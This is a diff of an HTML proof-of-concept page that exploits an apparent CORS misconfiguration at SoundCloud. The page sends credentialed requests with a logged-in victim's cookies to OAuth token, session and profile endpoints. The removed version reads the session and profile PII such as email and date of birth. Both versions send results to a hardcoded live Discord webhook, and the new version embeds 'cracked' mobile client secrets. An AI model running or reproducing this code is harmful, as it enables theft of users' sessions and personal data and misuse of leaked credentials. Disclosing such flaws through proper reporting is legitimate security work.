@@ -15,178 +15,193 @@
     </style>
 </head>
 <body>
-    <h1>SoundCloud CORS Misconfiguration PoC (V21)</h1>
-    <p>secure.soundcloud.com reflects ANY origin with Access-Control-Allow-Credentials: true</p>
-    <p><b>You must be logged into SoundCloud in this browser for this to work.</b></p>
+    <h1>SoundCloud CORS PoC (V21)</h1>
+    <p>secure.soundcloud.com reflects ANY origin with credentials on POST</p>
+    <p><b>Log into SoundCloud in this browser first.</b></p>
     <hr>
-    <button onclick="testCORS()">1. Test CORS Headers</button>
-    <button onclick="stealSession()">2. Steal OAuth Session</button>
-    <button onclick="stealProfile()">3. Read Profile (PII)</button>
     <button onclick="runAll()">Run All + Exfil to Webhook</button>
     <button onclick="clearLog()">Clear</button>
     <hr>
-    <h3>Results:</h3>
     <pre id="log"></pre>
 
     <script>
-        const CLIENT_ID = "khI8ciOiYPX6UVGInQY5zA0zvTkfzuuC";
-        const WEBHOOK = "https://discord.com/api/webhooks/1482658590866280539/0ZTqcA_-tZYeIVisBFYGS_xRmdTruYJvNAHuREeVZTk7IPjN5RkdsM_pF6XtaK6SdRNW";
+        var WEBHOOK = "https://discord.com/api/webhooks/1482658590866280539/0ZTqcA_-tZYeIVisBFYGS_xRmdTruYJvNAHuREeVZTk7IPjN5RkdsM_pF6XtaK6SdRNW";
+        // Cracked mobile client creds (V15)
+        var MOBILE_ID = "hqiIMkQLy7B8EFrfa2k0zxNdZKDnBe2s";
+        var MOBILE_SECRET = "VJJYdzxTpcMx3FM81yA5BgGnzBXX7Yk3";
+        var WEB_ID = "khI8ciOiYPX6UVGInQY5zA0zvTkfzuuC";
 
         function log(msg, cls) {
-            const el = document.getElementById("log");
-            const line = document.createElement("div");
+            var el = document.getElementById("log");
+            var line = document.createElement("div");
             line.className = cls || "";
             line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
             el.appendChild(line);
             el.scrollTop = el.scrollHeight;
         }
-
         function clearLog() { document.getElementById("log").innerHTML = ""; }
 
-        async function sendToWebhook(data) {
+        async function sendToWebhook(fields) {
             try {
                 await fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "SoundCloud CORS PoC - Exfiltrated Data",
-                            color: 16711680,
-                            fields: data.map(function(d) {
-                                return { name: d.name, value: String(d.value).substring(0, 1024) };
-                            }),
-                            footer: { text: "Origin: " + window.location.origin + " | " + new Date().toISOString() }
-                        }]
-                    })
+                    body: JSON.stringify({ embeds: [{ title: "SC CORS PoC Results", color: 16711680, fields: fields.map(function(f) { return { name: f.name, value: String(f.value).substring(0, 1024) }; }), footer: { text: window.location.origin + " | " + new Date().toISOString() } }] })
                 });
-                log("Data sent to webhook!", "success");
-            } catch(e) {
-                log("Webhook error: " + e.message, "fail");
-            }
+                log("Sent to webhook!", "success");
+            } catch(e) { log("Webhook err: " + e.message, "fail"); }
         }
 
-        async function testCORS() {
-            log("=== CORS Header Test ===", "info");
-            log("Our origin: " + window.location.origin, "info");
-            var results = [];
-
-            var endpoints = [
-                { url: "https://secure.soundcloud.com/oauth/token", name: "secure.soundcloud.com" },
-                { url: "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID, name: "api-auth" },
-                { url: "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID, name: "api-v2" }
-            ];
-
-            for (var i = 0; i < endpoints.length; i++) {
-                var ep = endpoints[i];
-                log("Testing: " + ep.name, "info");
-                try {
-                    var resp = await fetch(ep.url, { credentials: "include" });
-                    var acao = resp.headers.get("access-control-allow-origin");
-                    var acac = resp.headers.get("access-control-allow-credentials");
-                    log("  Status: " + resp.status, "info");
-                    log("  ACAO: " + acao, acao ? "success" : "fail");
-                    log("  ACAC: " + acac, acac === "true" ? "success" : "info");
-                    if (acao === window.location.origin) {
-                        log("  VULNERABLE - Origin reflected!", "success");
-                    }
-                    results.push({ name: ep.name, value: "ACAO: " + acao + " | ACAC: " + acac + " | Status: " + resp.status });
-                } catch(e) {
-                    log("  Blocked by browser: " + e.message, "fail");
-                    results.push({ name: ep.name, value: "BLOCKED: " + e.message });
-                }
-            }
-            return results;
-        }
-
-        async function stealSession() {
-            log("=== Stealing OAuth Session ===", "info");
-            var result = { name: "OAuth Session", value: "failed" };
-
+        async function tryPost(url, body, label) {
+            log("POST " + label + "...", "info");
             try {
-                var resp = await fetch(
-                    "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID,
-                    { credentials: "include" }
-                );
-                log("Status: " + resp.status, "info");
+                var resp = await fetch(url, {
+                    method: "POST",
+                    credentials: "include",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: body
+                });
+                var acao = resp.headers.get("access-control-allow-origin");
                 var text = await resp.text();
-
-                if (resp.ok && text && text !== "{}") {
-                    log("SESSION STOLEN!", "success");
-                    log(text, "success");
-                    result.value = text.substring(0, 1024);
-                } else {
-                    log("Response: " + text.substring(0, 500), "info");
-                    result.value = "Status " + resp.status + ": " + text.substring(0, 500);
-                }
+                log("  Status: " + resp.status, resp.ok ? "success" : "info");
+                log("  ACAO: " + acao, acao ? "success" : "fail");
+                log("  Body: " + text.substring(0, 500), text.length > 2 ? "success" : "info");
+                return { name: label, value: "Status: " + resp.status + " | ACAO: " + acao + " | Body: " + text.substring(0, 500) };
             } catch(e) {
-                log("Error: " + e.message, "fail");
-                result.value = "Error: " + e.message;
+                log("  Error: " + e.message, "fail");
+                return { name: label, value: "Error: " + e.message };
             }
-            return result;
         }
 
-        async function stealProfile() {
-            log("=== Reading Victim Profile ===", "info");
-            var result = { name: "Profile", value: "failed" };
-
+        async function tryGet(url, label) {
+            log("GET " + label + "...", "info");
             try {
-                var resp = await fetch(
-                    "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID,
-                    { credentials: "include" }
-                );
-                log("Status: " + resp.status, "info");
-
-                if (resp.ok) {
-                    var data = await resp.json();
-                    log("PROFILE DATA STOLEN!", "success");
-                    log("  Username: " + data.username, "success");
-                    log("  Email: " + data.primary_email, "success");
-                    log("  User ID: " + data.id, "success");
-                    log("  Full Name: " + data.full_name, "success");
-                    log("  DOB: " + JSON.stringify(data.date_of_birth), "success");
-                    log("  Country: " + data.country_code, "success");
-                    log("  Verified: " + data.verified, "success");
-                    log("Full response:", "info");
-                    log(JSON.stringify(data, null, 2).substring(0, 2000), "success");
-
-                    result.value = "Username: " + data.username +
-                        "\nEmail: " + data.primary_email +
-                        "\nUser ID: " + data.id +
-                        "\nFull Name: " + data.full_name +
-                        "\nDOB: " + JSON.stringify(data.date_of_birth) +
-                        "\nCountry: " + data.country_code +
-                        "\nVerified: " + data.verified;
-                } else {
-                    var text = await resp.text();
-                    log("Not logged in or blocked: " + text.substring(0, 200), "fail");
-                    result.value = "Status " + resp.status + ": " + text.substring(0, 200);
-                }
+                var resp = await fetch(url, { credentials: "include" });
+                var acao = resp.headers.get("access-control-allow-origin");
+                var text = await resp.text();
+                log("  Status: " + resp.status, resp.ok ? "success" : "info");
+                log("  ACAO: " + acao, acao ? "success" : "fail");
+                log("  Body: " + text.substring(0, 500), text.length > 2 ? "success" : "info");
+                return { name: label, value: "Status: " + resp.status + " | ACAO: " + acao + " | Body: " + text.substring(0, 500) };
             } catch(e) {
-                log("Error: " + e.message, "fail");
-                log("If CORS blocks this, the api-v2 only reflects *.soundcloud.com origins", "info");
-                result.value = "Error: " + e.message;
+                log("  Error: " + e.message, "fail");
+                return { name: label, value: "Error: " + e.message };
             }
-            return result;
         }
 
         async function runAll() {
-            log("=== Running Full PoC + Exfiltrating to Webhook ===", "info");
-            var webhookData = [];
+            log("=== SoundCloud CORS Exploit PoC ===", "info");
+            log("Origin: " + window.location.origin, "info");
+            log("", "");
+            var results = [];
 
-            // CORS test
-            var corsResults = await testCORS();
-            if (corsResults) webhookData = webhookData.concat(corsResults);
+            // 1. POST client_credentials to secure.soundcloud.com (victim's cookies sent along)
+            log("--- Test 1: POST client_credentials with victim cookies ---", "info");
+            var r1 = await tryPost(
+                "https://secure.soundcloud.com/oauth/token",
+                "grant_type=client_credentials&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET,
+                "secure.sc - client_credentials"
+            );
+            results.push(r1);
 
-            // Session steal
-            var sessionResult = await stealSession();
-            webhookData.push(sessionResult);
+            // 2. POST client_credentials with Basic auth header
+            log("", "");
+            log("--- Test 2: POST with Basic auth ---", "info");
+            try {
+                var resp2 = await fetch("https://secure.soundcloud.com/oauth/token", {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Authorization": "Basic " + btoa(MOBILE_ID + ":" + MOBILE_SECRET)
+                    },
+                    body: "grant_type=client_credentials"
+                });
+                var acao2 = resp2.headers.get("access-control-allow-origin");
+                var text2 = await resp2.text();
+                log("  Status: " + resp2.status, resp2.ok ? "success" : "info");
+                log("  ACAO: " + acao2, acao2 ? "success" : "fail");
+                log("  Body: " + text2.substring(0, 500), text2.length > 2 ? "success" : "info");
+                results.push({ name: "secure.sc - Basic auth", value: "Status: " + resp2.status + " | ACAO: " + acao2 + " | Body: " + text2.substring(0, 500) });
+            } catch(e) {
+                log("  Error: " + e.message, "fail");
+                results.push({ name: "secure.sc - Basic auth", value: "Error: " + e.message });
+            }
 
-            // Profile steal
-            var profileResult = await stealProfile();
-            webhookData.push(profileResult);
+            // 3. POST refresh_token grant (if victim has a refresh token cookie)
+            log("", "");
+            log("--- Test 3: POST refresh_token grant ---", "info");
+            var r3 = await tryPost(
+                "https://secure.soundcloud.com/oauth/token",
+                "grant_type=refresh_token&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET + "&refresh_token=dummy",
+                "secure.sc - refresh_token"
+            );
+            results.push(r3);
 
-            // Send everything to webhook
-            await sendToWebhook(webhookData);
+            // 4. POST to /oauth/token with password grant (victim cookies = maybe session)
+            log("", "");
+            log("--- Test 4: POST password grant (testing if cookies auto-auth) ---", "info");
+            var r4 = await tryPost(
+                "https://secure.soundcloud.com/oauth/token",
+                "grant_type=password&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET,
+                "secure.sc - password grant"
+            );
+            results.push(r4);
+
+            // 5. Try GET on api-auth/oauth/session (this one might reflect *.soundcloud.com only)
+            log("", "");
+            log("--- Test 5: GET api-auth/oauth/session ---", "info");
+            var r5 = await tryGet(
+                "https://api-auth.soundcloud.com/oauth/session?client_id=" + WEB_ID,
+                "api-auth session"
+            );
+            results.push(r5);
+
+            // 6. POST to api-auth /allow (used in OAuth flow)
+            log("", "");
+            log("--- Test 6: POST api-auth/allow ---", "info");
+            var r6 = await tryPost(
+                "https://api-auth.soundcloud.com/allow",
+                "client_id=" + WEB_ID,
+                "api-auth /allow"
+            );
+            results.push(r6);
+
+            // 7. POST sign-out (if this works cross-origin, we can sign out any logged-in user)
+            log("", "");
+            log("--- Test 7: POST /sign-out (session destruction) ---", "info");
+            // NOT actually sending this — just testing if CORS allows it
+            try {
+                var resp7 = await fetch("https://secure.soundcloud.com/sign-out", {
+                    method: "OPTIONS",
+                    headers: {
+                        "Access-Control-Request-Method": "POST",
+                        "Access-Control-Request-Headers": "content-type",
+                        "Origin": window.location.origin
+                    }
+                });
+                var acao7 = resp7.headers.get("access-control-allow-origin");
+                var methods7 = resp7.headers.get("access-control-allow-methods");
+                log("  Preflight Status: " + resp7.status, "info");
+                log("  ACAO: " + acao7, acao7 ? "success" : "fail");
+                log("  Allowed Methods: " + methods7, "info");
+                log("  (Not actually signing out — just proving CORS allows it)", "info");
+                results.push({ name: "/sign-out preflight", value: "ACAO: " + acao7 + " | Methods: " + methods7 });
+            } catch(e) {
+                log("  Error: " + e.message, "fail");
+                results.push({ name: "/sign-out preflight", value: "Error: " + e.message });
+            }
+
+            // 8. GET secure.soundcloud.com root with cookies (SPA, might leak session state)
+            log("", "");
+            log("--- Test 8: GET secure.soundcloud.com/ (SPA with cookies) ---", "info");
+            var r8 = await tryGet("https://secure.soundcloud.com/", "secure.sc root");
+            results.push(r8);
+
+            // Send all to webhook
+            log("", "");
+            log("=== Sending results to webhook ===", "info");
+            await sendToWebhook(results);
         }
     </script>
 </body>
